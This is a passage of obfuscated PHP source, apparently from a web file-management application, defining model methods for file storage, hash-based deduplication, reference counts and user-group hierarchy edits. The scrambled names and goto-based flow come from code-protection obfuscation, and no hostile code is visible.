($e¶½­î¦ÑÀ as $EöŞ¯íó³„) { if (isset($EöŞ¯íó³„[$d³Ó‚°áâ[2106]])) { $EáÁ£‹Çê³[] = $EöŞ¯íó³„[$d³Ó‚°áâ[2106]][$d³Ó‚°áâ[1403]]; } } $aÖç‚ = Model($d³Ó‚°áâ[481])->userListInfo($EáÁ£‹Çê³); goto f˜†ÀÓ³§Ì; f˜†ÀÓ³§Ì: foreach ($e¶½­î¦ÑÀ as &$EöŞ¯íó³„) { $EöŞ¯íó³„[$d³Ó‚°áâ[539]] = $aÖç‚[$EöŞ¯íó³„[$d³Ó‚°áâ[1403]]]; if (isset($EöŞ¯íó³„[$d³Ó‚°áâ[2106]])) { $EöŞ¯íó³„[$d³Ó‚°áâ[2106]][$d³Ó‚°áâ[539]] = $aÖç‚[$EöŞ¯íó³„[$d³Ó‚°áâ[2106]][$d³Ó‚°áâ[1403]]]; } } goto få¨ì„ççÜ; d¥ßÙ«Ñ²Ù: $d³Ó‚°áâ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EáÁ£‹Çê³ = array_unique(array_to_keyvalue($e¶½­î¦ÑÀ, $d³Ó‚°áâ[33], $d³Ó‚°áâ[1403])); $EáÁ£‹Çê³ = array_remove_value($EáÁ£‹Çê³, $d³Ó‚°áâ[472]); goto dÃ¬¢ªñŒÜ; få¨ì„ççÜ: } private function _listAppendMeta(&$e†ñÃé«­Æ) { goto C†È®Ñßî‚; C†È®Ñßî‚: $AÀ˜‹Óº‘É =& $_SERVER[ºÖÙÂŒäÉê‡]; $f§Ì¬Ï£ = array_unique(array_to_keyvalue($e†ñÃé«­Æ, $AÀ˜‹Óº‘É[33], $AÀ˜‹Óº‘É[2103])); $f§Ì¬Ï£ = array_remove_value($f§Ì¬Ï£, $AÀ˜‹Óº‘É[472]); goto eŞ¸İ¹ˆˆ; eŞ¸İ¹ˆˆ: if (!$f§Ì¬Ï£) { return; } foreach ($e†ñÃé«­Æ as $D¾Ç®É‚‡è) { if (isset($D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[2106]])) { $f§Ì¬Ï£[] = $D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[2106]][$AÀ˜‹Óº‘É[2103]]; } } $dÇÔÔô“»¼ = $this->metaList($f§Ì¬Ï£); goto e¦—Áç»Ï; e¦—Áç»Ï: if (!$dÇÔÔô“»¼) { return !1; } foreach ($e†ñÃé«­Æ as &$D¾Ç®É‚‡è) { $D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[421]] = $dÇÔÔô“»¼[$D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[2103]]]; if (isset($D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[2106]])) { $D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[2106]][$AÀ˜‹Óº‘É[421]] = $dÇÔÔô“»¼[$D¾Ç®É‚‡è[$AÀ˜‹Óº‘É[2106]][$AÀ˜‹Óº‘É[2103]]]; } } goto Fß•ïäƒ®”; Fß•ïäƒ®”: } private function metaList($AÔ‡Ş‘Šïö) { goto dù£×Û‘ÑÒ; dù£×Û‘ÑÒ: $aÈõ…î¾é¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$AÔ‡Ş‘Šïö) { return array(); } $aŸ˜Ëä§Ú = array($aÈõ…î¾é¸[2103] => array($aÈõ…î¾é¸[7], $AÔ‡Ş‘Šïö)); goto AééŒÜÒŠ; AééŒÜÒŠ: $fì¸¤“²äµ = Model($aÈõ…î¾é¸[2107])->where($aŸ˜Ëä§Ú)->select(); $fì¸¤“²äµ = array_to_keyvalue_group($fì¸¤“²äµ, $aÈõ…î¾é¸[2103]); foreach ($fì¸¤“²äµ as $F–„êõÚ¥¿ => $fƒ¸¤ç¦Ÿ ) { $FéÍÖ×‹ÊÇ = array(); foreach ($fƒ¸¤ç¦Ÿ  as $F¢™Îóèõ¢) { $FéÍÖ×‹ÊÇ[$F¢™Îóèõ¢[$aÈõ…î¾é¸[89]]] = $F¢™Îóèõ¢[$aÈõ…î¾é¸[364]]; } $fì¸¤“²äµ[$F–„êõÚ¥¿] = $FéÍÖ×‹ÊÇ; } goto D¯å˜åÅáÙ; D¯å˜åÅáÙ: return $fì¸¤“²äµ ? $fì¸¤“²äµ : array(); goto F£İÉÃ™º÷; F£İÉÃ™º÷: } } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\x65" => "\x69\x6f\137\146\x69\154\x65\137\x6d\x65\x74\x61", "\x6d\x65\164\141\x46\151\145\154\144" => "\146\151\x6c\145\x49\x44"); public function fileInfo($cµê„ğ•ˆ¤) { $Bñ—Ÿˆ¿òê =& $_SERVER[ºÖÙÂŒäÉê‡]; static $e‘Ä‚äÆè = array(); if (!isset($e‘Ä‚äÆè[$cµê„ğ•ˆ¤])) { $eœÆïíÜ—Ü = $Bñ—Ÿˆ¿òê[2108]; $BñàÒ¿¤éù = Model($Bñ—Ÿˆ¿òê[426])->field($eœÆïíÜ—Ü)->where(array($Bñ—Ÿˆ¿òê[424] => $cµê„ğ•ˆ¤))->find(); $e‘Ä‚äÆè[$cµê„ğ•ˆ¤] = $BñàÒ¿¤éù; } return $e‘Ä‚äÆè[$cµê„ğ•ˆ¤]; } public function addFileByContent($E¡à¨Ìñå = '', $f•´¶ÀÉ‚â = '') { goto A¾ª´«×Ëã; D•³º¢š®ò: if (file_exists($EØ“³ÙñÓé)) { @unlink($EØ“³ÙñÓé); } return $DŞŒ‰Ø‡º‡; goto Bğ…¶†×‚ó; FÔ†Ò¬õåÈ: $EØ“³ÙñÓé = $Fãô°…Š† . $D•ØÎĞº‚Ï[2110] . rand_string(16); file_put_contents($EØ“³ÙñÓé, $E¡à¨Ìñå); $DŞŒ‰Ø‡º‡ = $this->addFile($EØ“³ÙñÓé, $f•´¶ÀÉ‚â, !0); goto D•³º¢š®ò; A¾ª´«×Ëã: $D•ØÎĞº‚Ï =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fãô°…Š† = TEMP_PATH . $D•ØÎĞº‚Ï[2109]; if (!is_dir($Fãô°…Š†)) { mk_dir($Fãô°…Š†); } goto FÔ†Ò¬õåÈ; Bğ…¶†×‚ó: } public function createFileName($F‘¹ÉÙÑ¢—) { goto f†ÙˆÁ»ÎŠ; BìÔòÌ¹–â: $A×£°ÊÇ¸½ = $BÆŸ££Œ¡->pathFather($F¯…„ˆ¨’); static $D™Ê¯Ò ›± = false; $b½¢¡ÉßĞª = $b•Á÷•¥çÍ[2111] . md5($A×£°ÊÇ¸½); goto C¿Ú·ø¹²¶; f†ÙˆÁ»ÎŠ: $b•Á÷•¥çÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÆŸ££Œ¡ = IO::init($b•Á÷•¥çÍ[8]); $F¯…„ˆ¨’ = $this->makeFilePath($F‘¹ÉÙÑ¢—, $BÆŸ££Œ¡); goto BìÔòÌ¹–â; C¿Ú·ø¹²¶: if (!$D™Ê¯Ò ›± && !Cache::get($b½¢¡ÉßĞª)) { $D™Ê¯Ò ›± = !0; $fùùÂ½Ğƒ’ = IO::mkdir($A×£°ÊÇ¸½); if (!IO::exist($fùùÂ½Ğƒ’ . $b•Á÷•¥çÍ[2112])) { IO::mkfile($fùùÂ½Ğƒ’ . $b•Á÷•¥çÍ[2112]); } Cache::set($b½¢¡ÉßĞª, 1, 3600 * 2); } return $F¯…„ˆ¨’; goto Bëí²Í¼Ûº; Bëí²Í¼Ûº: } public function makeFilePath($bàÊÔÌšŠ, $f®â™áíº) { goto a¾ê”Šƒ³«; fÄŠ›ï’òİ: switch ($aÎêŠ§•æ) { case $eä·ÑÊˆ™´[2116]: $cšá·…“ÍÆ = $cšá·…“ÍÆ . $eä·ÑÊˆ™´[91] . $f®â™áíº->ext($bàÊÔÌšŠ); if ($f®â™áíº->ext($bàÊÔÌšŠ) == $eä·ÑÊˆ™´[2056]) { $cšá·…“ÍÆ .= $eä·ÑÊˆ™´[2117]; } break; case $eä·ÑÊˆ™´[2118]: goto cÈÄ‰îš³; c¢åÎ¾ÃØ: if ($f®â™áíº->ext($bàÊÔÌšŠ) == $eä·ÑÊˆ™´[2056]) { $bàÊÔÌšŠ .= $eä·ÑÊˆ™´[2117]; } $b”ÀëØ„Àó = IO::fileNameAuto($Cæ£´Ÿ, $bàÊÔÌšŠ); $cšá·…“ÍÆ = $Cæ£´Ÿ . $b”ÀëØ„Àó; goto bÃì³ÏöÁ„; bÃì³ÏöÁ„: break; goto eØ…™‰æ¤–; cÈÄ‰îš³: $b‰ÃÛ×‰õß = Model($eä·ÑÊˆ™´[1078])->get($eä·ÑÊˆ™´[1302]); $D¯İŸ®ô = substr(md5($eä·ÑÊˆ™´[1876] . $b‰ÃÛ×‰õß . date($eä·ÑÊˆ™´[684])), 0, 8); $Cæ£´Ÿ = KodIO::defaultIO() . date($eä·ÑÊˆ™´[2119]) . $D¯İŸ®ô . $eä·ÑÊˆ™´[8]; goto c¢åÎ¾ÃØ; eØ…™‰æ¤–: case $eä·ÑÊˆ™´[2115]: break; default: break; } return $cšá·…“ÍÆ; goto DáÙ¿È‡; a¾ê”Šƒ³«: $eä·ÑÊˆ™´ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÎêŠ§•æ = Model($eä·ÑÊˆ™´[1078])->get($eä·ÑÊˆ™´[2113]); $Cæ£´Ÿ = KodIO::defaultIO() . date($eä·ÑÊˆ™´[2114]); goto c¥ùÃÔ‚‘Ñ; c¥ùÃÔ‚‘Ñ: $cšá·…“ÍÆ = $Cæ£´Ÿ . rand_string(5) . short_id(100); $bàÊÔÌšŠ = str_replace($eä·ÑÊˆ™´[8], $eä·ÑÊˆ™´[70], KodIO::clear($bàÊÔÌšŠ)); if (!$bàÊÔÌšŠ) { $aÎêŠ§•æ = $eä·ÑÊˆ™´[2115]; } goto fÄŠ›ï’òİ; DáÙ¿È‡: } public function addFileByRemote($b´…ÍÊ®ŠË, $F×…‚ÇŸ×™, $bÓÄ× ¨ñÉ = array()) { goto bÍ¬„½ñ¸…; bÍ¬„½ñ¸…: $E‡ò‰ „Œ¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!IO::exist($b´…ÍÊ®ŠË)) { return !1; } $d¸Ö‘Ì‰ƒ– = $bÓÄ× ¨ñÉ[$E‡ò‰ „Œ¥[159]] ? $bÓÄ× ¨ñÉ[$E‡ò‰ „Œ¥[159]] : $E‡ò‰ „Œ¥[33]; goto BÕ¶ÒÏõ§«; D£­‚ùíÇ„: if ($E……­ë…„Í = $this->addFileCheckExist($BŸÜĞîÕéÜ[$E‡ò‰ „Œ¥[160]], $BŸÜĞîÕéÜ[$E‡ò‰ „Œ¥[159]], $BŸÜĞîÕéÜ[$E‡ò‰ „Œ¥[77]])) { return $E……­ë…„Í; } return $this->addFileData($BŸÜĞîÕéÜ); goto CîÁŞÄùˆ´; BÕ¶ÒÏõ§«: $bÔùÖÕÕô‚ = IO::hashMd5($b´…ÍÊ®ŠË, $d¸Ö‘Ì‰ƒ–); $f›œ¯–Ì° = KodIO::defaultDriver(); $BŸÜĞîÕéÜ = array($E‡ò‰ „Œ¥[524] => IO::size($b´…ÍÊ®ŠË), $E‡ò‰ „Œ¥[2120] => 1, $E‡ò‰ „Œ¥[391] => $F×…‚ÇŸ×™, $E‡ò‰ „Œ¥[734] => $f›œ¯–Ì°[$E‡ò‰ „Œ¥[372]], $E‡ò‰ „Œ¥[392] => $b´…ÍÊ®ŠË, $E‡ò‰ „Œ¥[2121] => $bÓÄ× ¨ñÉ[$E‡ò‰ „Œ¥[160]] ? $bÓÄ× ¨ñÉ[$E‡ò‰ „Œ¥[160]] : IO::hashSimple($b´…ÍÊ®ŠË), $E‡ò‰ „Œ¥[2122] => $bÔùÖÕÕô‚ ? $bÔùÖÕÕô‚ : $d¸Ö‘Ì‰ƒ–); goto D£­‚ùíÇ„; CîÁŞÄùˆ´: } private function addFileData($A„¿ˆĞ·Àö) { $d´âÊ ‘¨Ğ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$A„¿ˆĞ·Àö) { return !1; } $A„¿ˆĞ·Àö[$d´âÊ ‘¨Ğ[77]] = intval($A„¿ˆĞ·Àö[$d´âÊ ‘¨Ğ[77]]); if (!$A„¿ˆĞ·Àö[$d´âÊ ‘¨Ğ[77]] && strlen($A„¿ˆĞ·Àö[$d´âÊ ‘¨Ğ[160]]) > 32) { $A„¿ˆĞ·Àö[$d´âÊ ‘¨Ğ[77]] = intval(substr($A„¿ˆĞ·Àö[$d´âÊ ‘¨Ğ[160]], 32)); } $A¸ÂÕ¤£ = $this->add($A„¿ˆĞ·Àö); return $this->find($A¸ÂÕ¤£); } public function addFile($fƒìßÃ³”è, $Då±¾•Çòô, $eõèì»š©° = false) { $c×§¦ÚøÉ = IO::hashSimple($fƒìßÃ³”è); $aœ½‚ø»‡ƒ = IO::hashMd5($fƒìßÃ³”è); $f©ÁïŠ×Ê = IO::size($fƒìßÃ³”è); if ($C½¦µ„à¨„ = $this->addFileCheckExist($c×§¦ÚøÉ, $aœ½‚ø»‡ƒ, $f©ÁïŠ×Ê)) { return $C½¦µ„à¨„; } $C¶õâğã± = $this->addFileMake($fƒìßÃ³”è, $f©ÁïŠ×Ê, $c×§¦ÚøÉ, $aœ½‚ø»‡ƒ, $Då±¾•Çòô, $eõèì»š©°); return $this->addFileData($C¶õâğã±); } public function addFileMake($d—„‹ìÌ’–, $CØ®‚•÷æ, $A§Ñâš—İì, $B¤ÚÄ³©˜ã, $bî×™»—ñÌ, $F™íìÎ×ò) { goto EÄÕÔ–ƒµ; c˜Şè¡ô´‹: $E—×ù£¢‡› = get_path_this($cù¶Ô¨Ä•); if ($F™íìÎ×ò) { $CÅóœ¹×¤÷ = IO::move($d—„‹ìÌ’–, $aƒ¼Õ²¨®, !1, $E—×ù£¢‡›); } else { $CÅóœ¹×¤÷ = IO::copy($d—„‹ìÌ’–, $aƒ¼Õ²¨®, !1, $E—×ù£¢‡›); } if (!$CÅóœ¹×¤÷) { return !1; } goto E‡‡ğ§‘‘æ; EÄÕÔ–ƒµ: $fÊ©í«« =& $_SERVER[ºÖÙÂŒäÉê‡]; $cù¶Ô¨Ä• = $this->createFileName($bî×™»—ñÌ); $aƒ¼Õ²¨® = get_path_father($cù¶Ô¨Ä•); goto c˜Şè¡ô´‹; E‡‡ğ§‘‘æ: $b÷Æç´¬é‹ = KodIO::defaultDriver(); $d­Å‚èÒ½ƒ = array($fÊ©í««[524] => $CØ®‚•÷æ, $fÊ©í««[2120] => 1, $fÊ©í««[391] => $bî×™»—ñÌ, $fÊ©í««[734] => $b÷Æç´¬é‹[$fÊ©í««[372]], $fÊ©í««[392] => $cù¶Ô¨Ä•, $fÊ©í««[2121] => $A§Ñâš—İì, $fÊ©í««[2122] => $B¤ÚÄ³©˜ã); return $d­Å‚èÒ½ƒ; goto bíÎ«·÷ƒ; bíÎ«·÷ƒ: } public function addFileCheckExist($a¹ñƒ”ÕÙ, $Aàø¤È·²», $eÇç‰çç¢Ş) { $BÍ¸¤ÀĞ·ß =& $_SERVER[ºÖÙÂŒäÉê‡]; $FŞ„†ÆÖ¹‚ = $this->findByHash($a¹ñƒ”ÕÙ, $Aàø¤È·²»); if (!$FŞ„†ÆÖ¹‚) { return !1; } $dô‰³±ÚÃğ = array($BÍ¸¤ÀĞ·ß[2120] => intval($FŞ„†ÆÖ¹‚[$BÍ¸¤ÀĞ·ß[2123]]) + 1, $BÍ¸¤ÀĞ·ß[524] => $eÇç‰çç¢Ş); $this->where(array($BÍ¸¤ÀĞ·ß[424] => $FŞ„†ÆÖ¹‚[$BÍ¸¤ÀĞ·ß[423]]))->save($dô‰³±ÚÃğ); return $FŞ„†ÆÖ¹‚; } public function remove($aé‚ìø¢½) { $this->linkCountChange($aé‚ìø¢½, !1); $this->clearEmpty(); return !0; } public function linkAdd($b÷ˆÉ¿™ ª) { $this->linkCountChange($b÷ˆÉ¿™ ª, !0); } public function linkCountChange($FÏ¬ù‡Üğ, $FÆ¬Òïô‡Ç) { goto e¥ÜŠÕà“; e¥ÜŠÕà“: $dŠ¨‘¤ÑÅß =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$FÏ¬ù‡Üğ) { return; } if (!is_array($FÏ¬ù‡Üğ)) { $FÏ¬ù‡Üğ = array($FÏ¬ù‡Üğ); } goto DáóêÇƒ‚Ÿ; FÇ¸×âã–: foreach ($cÂ×‹æº” as $A¢ìÎ÷† => $BäÓØ¨ï’‚) { $f°µ§’—† = $BäÓØ¨ï’‚ . $dŠ¨‘¤ÑÅß[33]; if (!$Bœˆçõ¡…[$f°µ§’—†]) { $Bœˆçõ¡…[$f°µ§’—†] = array(); } $Bœˆçõ¡…[$f°µ§’—†][] = $A¢ìÎ÷†; } foreach ($Bœˆçõ¡… as $BäÓØ¨ï’‚ => $Eºô½¶¹Å) { if (!$Eºô½¶¹Å) { continue; } $BäÓØ¨ï’‚ = $FÆ¬Òïô‡Ç ? $BäÓØ¨ï’‚ : -intval($BäÓØ¨ï’‚); $bİ­ÅŞù£‹ = array($dŠ¨‘¤ÑÅß[423] => array($dŠ¨‘¤ÑÅß[7], $Eºô½¶¹Å)); if ($BäÓØ¨ï’‚ < 0) { $bİ­ÅŞù£‹[$dŠ¨‘¤ÑÅß[2123]] = array($dŠ¨‘¤ÑÅß[921], abs($BäÓØ¨ï’‚)); } $this->where($bİ­ÅŞù£‹)->setAdd($dŠ¨‘¤ÑÅß[2123], $BäÓØ¨ï’‚); } goto a‰‘Àôö; DáóêÇƒ‚Ÿ: $cÂ×‹æº” = array(); foreach ($FÏ¬ù‡Üğ as $A¢ìÎ÷†) { $f°µ§’—† = $A¢ìÎ÷† . $dŠ¨‘¤ÑÅß[33]; if (!$cÂ×‹æº”[$f°µ§’—†]) { $cÂ×‹æº”[$f°µ§’—†] = 0; } $cÂ×‹æº”[$f°µ§’—†]++; } $Bœˆçõ¡… = array(); goto FÇ¸×âã–; a‰‘Àôö: } public function findByHash($AôøÙñ·ï±, $F—‡ëÚİÆ„ = false) { $Dß¥Ïä÷ç =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$AôøÙñ·ï± && !$F—‡ëÚİÆ„) { return !1; } $EİÒßôÎ· = array($Dß¥Ïä÷ç[2121] => $AôøÙñ·ï±); if ($F—‡ëÚİÆ„) { $EİÒßôÎ· = array($Dß¥Ïä÷ç[2122] => $F—‡ëÚİÆ„); } return $this->order($Dß¥Ïä÷ç[2124])->where($EİÒßôÎ·)->find(); } public function clearEmpty($bÁÌÄ¡Ê„Ÿ = 0) { goto f™‹ÂÍé; f™‹ÂÍé: $fë´¥‚‚â³ =& $_SERVER[ºÖÙÂŒäÉê‡]; $açç¹á´İî = time() - 3600 * 24 * $bÁÌÄ¡Ê„Ÿ; $C„ìŠÒ­°¢ = $fë´¥‚‚â³[2125] . $açç¹á´İî; goto c™‹œÊè; c™‹œÊè: $FŸŸ”‰¤ÃÖ = $this->where($C„ìŠÒ­°¢)->select(); if (!$FŸŸ”‰¤ÃÖ) { return; } $A¼¢çŒÁä¡ = new Task($fë´¥‚‚â³[2126], $fë´¥‚‚â³[33], count($FŸŸ”‰¤ÃÖ)); goto AŸÙÇÚÔëä; AŸÙÇÚÔëä: foreach ($FŸŸ”‰¤ÃÖ as $DÜ½ÛåÇÅ) { $A¼¢çŒÁä¡->update(1); $this->resetFile($DÜ½ÛåÇÅ); } $A¼¢çŒÁä¡->end(); goto bƒ¼å‰‰°; bƒ¼å‰‰°: } private function resetFile($EášŠ’Ê‚¥) { goto e·ì•»ßß; D’°‚¢èÈ¬: $FùŠ“º‘¹õ = Model($aç„ÔäÁÚ‹[2127])->where($f­›¬’²Åº)->count(); $aãİ¿¨•Ü = intval($BÃõ¿Üöôë) + intval($FùŠ“º‘¹õ); if ($aãİ¿¨•Ü == 0) { IO::remove($EášŠ’Ê‚¥[$aç„ÔäÁÚ‹[75]]); $this->where($f­›¬’²Åº)->delete(); $this->metaSet($EášŠ’Ê‚¥[$aç„ÔäÁÚ‹[423]], null, null); return; } goto d¶¶š“Ô; d¶¶š“Ô: if ($EášŠ’Ê‚¥[$aç„ÔäÁÚ‹[2123]] != $aãİ¿¨•Ü) { $this->where($f­›¬’²Åº)->save(array($aç„ÔäÁÚ‹[2120] => $aãİ¿¨•Ü)); } goto FËİè©óÉ¾; e·ì•»ßß: $aç„ÔäÁÚ‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f­›¬’²Åº = array($aç„ÔäÁÚ‹[424] => $EášŠ’Ê‚¥[$aç„ÔäÁÚ‹[423]]); $BÃõ¿Üöôë = Model($aç„ÔäÁÚ‹[1100])->where($f­›¬’²Åº)->count(); goto D’°‚¢èÈ¬; FËİè©óÉ¾: } public function storageInfo($AÕÀöñÍ = false) { goto DŸï²ĞÓ¯Œ; DŸï²ĞÓ¯Œ: $eå­‡¬Üøß =& $_SERVER[ºÖÙÂŒäÉê‡]; $b‰ŞŠÇ­±ê = $this->count() + 0.0; $Bï¹µªªğ = 0; goto E‡ªçğŒº; aÈÇ‹¯ÓøÑ: for ($cš’èÏÔÚ = 0; $cš’èÏÔÚ < $b‰ŞŠÇ­±ê; $cš’èÏÔÚ = $cš’èÏÔÚ + $c‡‰¸ÖÌÆ¾) { $b­ËÆöá£‰ = $this->limit($cš’èÏÔÚ, $cš’èÏÔÚ + $c‡‰¸ÖÌÆ¾)->select(); foreach ($b­ËÆöá£‰ as $fÀÈÏ±©Æ°) { $dßÄ¹–è += $fÀÈÏ±©Æ°[$eå­‡¬Üøß[77]] * $fÀÈÏ±©Æ°[$eå­‡¬Üøß[2123]]; $Bï¹µªªğ += $fÀÈÏ±©Æ°[$eå­‡¬Üøß[77]] * ($fÀÈÏ±©Æ°[$eå­‡¬Üøß[2123]] - 1); $Fä†Ü÷İİ += $fÀÈÏ±©Æ°[$eå­‡¬Üøß[2123]]; } } $Béë½ÚƒÎ‹ = array($eå­‡¬Üøß[2128] => $dßÄ¹–è, $eå­‡¬Üøß[2129] => $Bï¹µªªğ, $eå­‡¬Üøß[2130] => $Bï¹µªªğ / $dßÄ¹–è, $eå­‡¬Üøß[81] => $b‰ŞŠÇ­±ê, $eå­‡¬Üøß[2131] => $Fä†Ü÷İİ); return $Béë½ÚƒÎ‹; goto e”»ãœßñ˜; E‡ªçğŒº: $dßÄ¹–è = 1; $Fä†Ü÷İİ = 0; $c‡‰¸ÖÌÆ¾ = 5000; goto aÈÇ‹¯ÓøÑ; e”»ãœßñ˜: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\x70"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\x6d\145" => "\x67\162\157\x75\160\x5f\155\145\164\x61", "\155\145\x74\x61\106\151\x65\x6c\144" => "\147\x72\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($aÑêº“Å–¥) { $Dš‰¯¶ß–• =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($Dš‰¯¶ß–•[2132] => array($aÑêº“Å–¥[0], $Dš‰¯¶ß–•[2133]), $Dš‰¯¶ß–•[2134] => array($aÑêº“Å–¥[0], $Dš‰¯¶ß–•[2133])); } protected function getInfo($CÁ‡ßé¬‘) { $d­‚ÙÆ‚ˆß = $this->getInfoSimple($CÁ‡ßé¬‘); if (!$d­‚ÙÆ‚ˆß) { return !1; } return $this->_listDataApplyItem($d­‚ÙÆ‚ˆß); } protected function getInfoSimple($B¨Íá¦¹Ú, $f»£—¾”‡Ç = false) { $A¯ê°¶í¿¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($f»£—¾”‡Ç) { $a¶‘Ü™‘Õ = array($A¯ê°¶í¿¾[2066] => intval($B¨Íá¦¹Ú)); $fÇŠ¼µŠ‰‘ = $this->where($a¶‘Ü™‘Õ)->find(); return is_array($fÇŠ¼µŠ‰‘) ? $fÇŠ¼µŠ‰‘ : array(); } return $this->cacheFunctionGet($A¯ê°¶í¿¾[2135], $B¨Íá¦¹Ú); } protected function groupAdd($AƒØ°‚Ç„) { goto dôò¬âöƒ; dôò¬âöƒ: $bÀ§Œ„•² =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$AƒØ°‚Ç„[$bÀ§Œ„•²[465]] && isset($AƒØ°‚Ç„[$bÀ§Œ„•²[2066]]) && $AƒØ°‚Ç„[$bÀ§Œ„•²[2066]] == 1) { if ($Dí©÷Áåã½ = $this->getInfoSimple($AƒØ°‚Ç„[$bÀ§Œ„•²[2066]], !0)) { return $AƒØ°‚Ç„[$bÀ§Œ„•²[2066]]; } } else { $Dí©÷Áåã½ = $this->getInfoSimple($AƒØ°‚Ç„[$bÀ§Œ„•²[465]]); if (!$Dí©÷Áåã½) { return !1; } } $BŠ…’ĞŞ×Ó = $bÀ§Œ„•²[474]; goto c¹ÃÁ¹»¶Í; FÀ‚ôÇŞÃÕ: if (!empty($AƒØ°‚Ç„[$bÀ§Œ„•²[2066]])) { $F‹¹­Ã©ˆ—[$bÀ§Œ„•²[2066]] = $AƒØ°‚Ç„[$bÀ§Œ„•²[2066]]; } $añ œÃÛÄÚ = $this->add($F‹¹­Ã©ˆ—); $this->setNamePinyin($añ œÃÛÄÚ, $F‹¹­Ã©ˆ—[$bÀ§Œ„•²[28]]); goto d´Òñ†Ê³ß; c¹ÃÁ¹»¶Í: if ($Dí©÷Áåã½[$bÀ§Œ„•²[463]]) { $BŠ…’ĞŞ×Ó = $Dí©÷Áåã½[$bÀ§Œ„•²[463]] . $Dí©÷Áåã½[$bÀ§Œ„•²[2066]] . $bÀ§Œ„•²[47]; } $F‹¹­Ã©ˆ— = array($bÀ§Œ„•²[391] => $this->groupNameAuto($AƒØ°‚Ç„[$bÀ§Œ„•²[465]], $AƒØ°‚Ç„[$bÀ§Œ„•²[28]]), $bÀ§Œ„•²[373] => $AƒØ°‚Ç„[$bÀ§Œ„•²[465]], $bÀ§Œ„•²[529] => $BŠ…’ĞŞ×Ó, $bÀ§Œ„•²[2136] => $AƒØ°‚Ç„[$bÀ§Œ„•²[2050]], $bÀ§Œ„•²[2137] => 0, $bÀ§Œ„•²[2070] => 0); if (isset($AƒØ°‚Ç„[$bÀ§Œ„•²[2087]])) { $F‹¹­Ã©ˆ—[$bÀ§Œ„•²[2087]] = $AƒØ°‚Ç„[$bÀ§Œ„•²[2087]]; } else { $b¶ªÌ¼„ÄŸ = $this->max($bÀ§Œ„•²[2087]); if (!$b¶ªÌ¼„ÄŸ) { $b¶ªÌ¼„ÄŸ = 0; } $F‹¹­Ã©ˆ—[$bÀ§Œ„•²[2087]] = $b¶ªÌ¼„ÄŸ + 1; } goto FÀ‚ôÇŞÃÕ; d´Òñ†Ê³ß: Model($bÀ§Œ„•²[1100])->groupRootAdd($añ œÃÛÄÚ); return $añ œÃÛÄÚ; goto aõ²ÇøŞÔ; aõ²ÇøŞÔ: } protected function groupEdit($DÆº· â¿¥, $b¼©´È˜ç) { $c¬ì–¢•îå =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($b¼©´È˜ç[$c¬ì–¢•îå[465]])) { $Aë°ØÑŸ›Ğ = $this->getInfoSimple($DÆº· â¿¥); $AŞ¹¥·±è = $this->getInfoSimple($b¼©´È˜ç[$c¬ì–¢•îå[465]]); if (!$Aë°ØÑŸ›Ğ || !$AŞ¹¥·±è) { return !1; } if ($Aë°ØÑŸ›Ğ[$c¬ì–¢•îå[2066]] == $AŞ¹¥·±è[$c¬ì–¢•îå[2066]]) { return !1; } if ($b¼©´È˜ç[$c¬ì–¢•îå[465]] != $Aë°ØÑŸ›Ğ[$c¬ì–¢•îå[465]]) { if ($AŞ¹¥·±è[$c¬ì–¢•îå[463]] !== $Aë°ØÑŸ›Ğ[$c¬ì–¢•îå[463]] && strpos($AŞ¹¥·±è[$c¬ì–¢•îå[463]], $Aë°ØÑŸ›Ğ[$c¬ì–¢•îå[463]] . $Aë°ØÑŸ›Ğ[$c¬ì–¢•îå[2066]] . $c¬ì–¢•îå[47]) === 0) { return !1; } $b¼©´È˜ç[$c¬ì–¢•îå[529]] = $AŞ¹¥·±è[$c¬ì–¢•îå[463]] . $b¼©´È˜ç[$c¬ì–¢•îå[465]] . $c¬ì–¢•îå[47]; $this->_changeChildLevel($Aë°ØÑŸ›Ğ, $AŞ¹¥·±è); } } if (isset($b¼©´È˜ç[$c¬ì–¢•îå[28]])) { $this->setNamePinyin($DÆº· â¿¥, $b¼©´È˜ç[$c¬ì–¢•îå[28]]); } return $this->where(array($c¬ì–¢•îå[2138] => $DÆº· â¿¥))->save($b¼©´È˜ç); } private function _changeChildLevel($AÔñ›Ê…ç, $AÉäíîî˜ª, $cà–£Š˜Âê = false) { goto b£ë Îç­; D†®Ğ”åÒ: $this->where($b †œ†È×§)->data($d¶…§°¿Üï)->save(); goto bŒİÆßƒî³; b£ë Îç­: $b†õ¶é…¼Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $BïôÔ–Á©¶ = $AÔñ›Ê…ç[$b†õ¶é…¼Ø[463]] . $AÔñ›Ê…ç[$b†õ¶é…¼Ø[2066]] . $b†õ¶é…¼Ø[47]; $EÖ—óÙĞí = $AÉäíîî˜ª[$b†õ¶é…¼Ø[463]] . $AÉäíîî˜ª[$b†õ¶é…¼Ø[2066]] . $b†õ¶é…¼Ø[47] . $AÔñ›Ê…ç[$b†õ¶é…¼Ø[2066]] . $b†õ¶é…¼Ø[47]; goto bˆ¨ÒŸ’ïŠ; bˆ¨ÒŸ’ïŠ: if ($cà–£Š˜Âê) { $EÖ—óÙĞí = $AÉäíîî˜ª[$b†õ¶é…¼Ø[463]] . 